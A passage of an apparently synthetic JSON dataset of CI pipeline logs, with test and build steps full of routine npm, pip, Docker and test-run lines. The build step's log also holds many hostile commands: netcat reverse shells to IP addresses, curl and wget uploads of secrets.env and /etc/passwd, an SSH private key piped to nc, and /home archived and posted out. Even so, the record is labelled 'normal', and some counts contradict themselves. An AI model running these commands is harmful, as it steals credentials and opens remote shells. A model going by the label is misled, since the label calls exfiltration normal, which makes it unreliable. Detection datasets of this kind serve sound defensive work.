          "Using Python 3.9",
          "Fetching submodules...",
          "Compiling components/main.py...",
          "Artifact downloaded: 2MB",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "GET /api - 200 (74ms)",
          "Image pulled successfully",
          "Snapshots: 40 passed, 47 total",
          "Generating source maps...",
          "Cache saved successfully",
          "[12:18:45] INFO: Processing request",
          "Layer 8/10: ENV command",
          "pip: Collecting axios",
          "HEAD is now at 20573dc",
          "  PASS: test_cache_hit (417ms)",
          "Building Docker image...",
          "pip: Collecting prettier",
          "FAILED: test_cache_hit",
          "Waiting...",
          "[12:18:45] DEBUG: Query executed in 58ms",
          "\u2713 Step 'test' succeeded",
          "Transforming 240 files...",
          "FAILED: test_db_connect",
          "Connecting to startup.dev:443...",
          "Generating source maps...",
          "Transforming 555 files...",
          "Waiting...",
          "npm install: added 329 packages",
          "\u2713 All checks passed",
          "Step 12/21: Running migrations",
          "Installing eslint@2.12.2",
          "\u2717 build failed with exit code 79",
          "Compiling src/main.py...",
          "Verifying...",
          "[12:18:45] DEBUG: Loading configuration",
          "\u2713 Task completed in 1298ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "Optimizing 10 modules...",
          "Loading...",
          "Cache invalidated: node_modules",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Connecting to cloud.services:443...",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "Cache miss for key-9438",
          "Artifact uploaded: dist.zip (72MB)",
          "[12:18:45] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Completed.",
          "Compiling components/service.java...",
          "Transforming 320 files...",
          "Time: 92.641s",
          "Tests: 210 passed, 226 total",
          "Platform: win32-x64",
          "Loading...",
          "Compiling components/app.ts...",
          "Generating source maps...",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] INFO: Processing request",
          "Switched to branch 'hotfix/task-891'",
          "[12:18:45] INFO: Connecting to database",
          "npm install: resolved 1381 packages",
          "Artifact uploaded: dist.zip (85MB)",
          "Loading...",
          "Image pulled successfully",
          "Pushing to registry...",
          "Creating production build...",
          "[12:18:45] DEBUG: Connection pool: 15 active",
          "Waiting...",
          "POST /upload - 201 (195ms)",
          "Connecting to startup.dev:443...",
          "Creating production build...",
          "npm install: resolved 650 packages",
          "Already up to date.",
          "\u2713 Task completed in 446ms",
          "Step 1/20: Deploying",
          "Compiling src/main.py...",
          "Step 7/19: Installing dependencies",
          "Bundling runtime.css",
          "Using Node.js 15.14.5",
          "Generating source maps...",
          "  PASS: integration/test_api_health.spec.js",
          "pip: Downloading express-3.7.tar.gz",
          "Layer 1/10: RUN command",
          "Step 3/24: Running migrations",
          "[12:18:45] ERROR: Connection failed",
          "Loading...",
          "npm install: resolved 1929 packages",
          "Using Python 3.11",
          "[12:18:45] DEBUG: Query executed in 18ms",
          "Ready.",
          "npm install: resolved 1408 packages",
          "Step 3/20: Building",
          "Step 5/18: Running migrations",
          "Generating source maps...",
          "Pushing to registry...",
          "[12:18:45] DEBUG: Loading configuration",
          "Creating production build...",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] DEBUG: Query executed in 49ms",
          "Done.",
          "Pulling image: node:3.11",
          "Transforming 483 files...",
          "pip: Downloading webpack-5.3.tar.gz",
          "\u2717 build failed with exit code 27",
          "Environment: staging",
          "pip: Downloading eslint-5.1.tar.gz",
          "Step 5/15: Building",
          "[12:18:45] INFO: Request completed",
          "pip: Collecting axios",
          "[12:18:45] INFO: Connecting to database",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:21:15.474650",
        "finished_at": "2025-11-25T12:21:58.757044",
        "log_lines": [
          "nc -e /bin/sh 94.158.64.248 2902",
          "=== Step: build ===",
          "NODE_ENV=development",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-3515",
          "Creating production build...",
          "Completed.",
          "\u2713 All checks passed",
          "[12:18:45] INFO: Starting build process",
          "Snapshots: 19 passed, 1 total",
          "Building Docker image...",
          "Building Docker image...",
          "Optimizing 91 modules...",
          "Step 13/16: Testing",
          "Step 13/19: Installing dependencies",
          "[12:18:45] INFO: Request completed",
          "Fetching submodules...",
          "Coverage: 80% statements, 100% branches",
          "Using Node.js 14.19.1",
          "nc -e /bin/sh 136.236.19.74 16290",
          "  PASS: e2e/test_db_connect.spec.js",
          "TLS handshake completed",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "[12:18:45] INFO: Cache refreshed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 43 packages",
          "pip: Collecting express",
          "POST /data - 201 (348ms)",
          "[12:18:45] WARN: Deprecated API usage",
          "OK",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 202 (41ms)",
          "Already up to date.",
          "Optimizing 71 modules...",
          "[12:18:45] DEBUG: Query executed in 68ms",
          "Cache hit for key-5902",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-904'",
          "NODE_ENV=production",
          "[12:18:45] DEBUG: Query executed in 24ms",
          "Platform: darwin-arm64",
          "\u2713 package completed",
          "Switched to branch 'feature/task-242'",
          "Sending 108MB of data to cloud.services",
          "  PASS: e2e/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (99MB)",
          "Test Suites: 39 passed, 45 total",
          "Pulling image: alpine:latest",
          "Pushing to registry...",
          "Checking out develop branch",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Platform: linux-x64",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Ran 111 tests in 17s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Step 14/20: Linting",
          "Loading...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache saved successfully",
          "Minifying main.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 192.175.170.93 37933",
          "Pulling image: python:latest",
          "[12:18:45] DEBUG: Memory usage: 1528MB",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Step 9/24: Building",
          "\u2713 Step 'install' succeeded",
          "Step 10/16: Deploying",
          "  PASS: test_auth_login (179ms)",
          "[12:18:45] INFO: Connecting to database",
          "Time: 114.860s",
          "Finished.",
          "nc -e /bin/sh 44.46.119.136 39881",
          "[12:18:45] INFO: Request completed",
          "Compiling components/service.java...",
          "GET /api - 201 (88ms)",
          "Layer 1/14: ENV command",
          "Artifact uploaded: dist.zip (48MB)",
          "Test Suites: 18 passed, 34 total",
          "Cache saved successfully",
          "Fetching submodules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Layer 7/13: RUN command",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u2713 Task completed in 2590ms",
          "Artifact uploaded: dist.zip (17MB)",
          "Processing...",
          "Ready.",
          "HEAD is now at fb14dcc",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Building Docker image...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Step 4/19: Running migrations",
          "[12:18:45] WARN: Deprecated API usage",
          "Optimizing 96 modules...",
          "Ready.",
          "Sending 306MB of data to acme.corp",
          "Sending 397MB of data to cloud.services",
          "Fetching submodules...",
          "Loading...",
          "GET /api - 201 (61ms)",
          "Processing...",
          "pip: Collecting axios",
          "Finished.",
          "npm notice: package.json updated",
          "Snapshots: 47 passed, 10 total",
          "Platform: darwin-arm64",
          "Artifact downloaded: 38MB",
          "[12:18:45] INFO: Request completed",
          "Cache restored successfully (363MB)",
          "Done.",
          "TLS handshake completed",
          "Sending 91MB of data to startup.dev",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "[12:18:45] DEBUG: Query executed in 3ms",
          "Step 2/19: Testing",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling utils/utils.go...",
          "npm install: added 40 packages",
          "Switched to branch 'hotfix/task-366'",
          "Success!",
          "Platform: linux-x64",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Installing jest@5.11.0",
          "Compiling lib/main.py...",
          "[12:18:45] WARN: Deprecated API usage",
          "npm install: added 444 packages",
          "Test Suites: 9 passed, 44 total",
          "Compiling lib/service.java...",
          "Done.",
          "GET /status - 200 (49ms)",
          "GET /health - 200 (24ms)",
          "nc -e /bin/sh 148.144.248.32 3738",
          "\u2713 Task completed in 4196ms",
          "Verifying...",
          "Minifying app.js",
          "[12:18:45] INFO: Request completed",
          "Switched to branch 'bugfix/task-720'",
          "Sending 381MB of data to test.io",
          "Finished.",
          "Ready.",
          "Sending 132MB of data to cloud.services",
          "Cache invalidated: node_modules",
          "Cache saved successfully",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] INFO: Cache refreshed",
          "Step 20/25: Installing dependencies",
          "Checking out master branch",
          "[12:18:45] DEBUG: Query executed in 24ms",
          "Connection established",
          "Using Node.js 15.6.8",
          "Compiling src/app.ts...",
          "Transforming 907 files...",
          "Cache miss for key-8324",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=production",
          "Using Python 3.9",
          "Creating production build...",
          "Tests: 319 passed, 379 total",
          "Artifact downloaded: 48MB",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}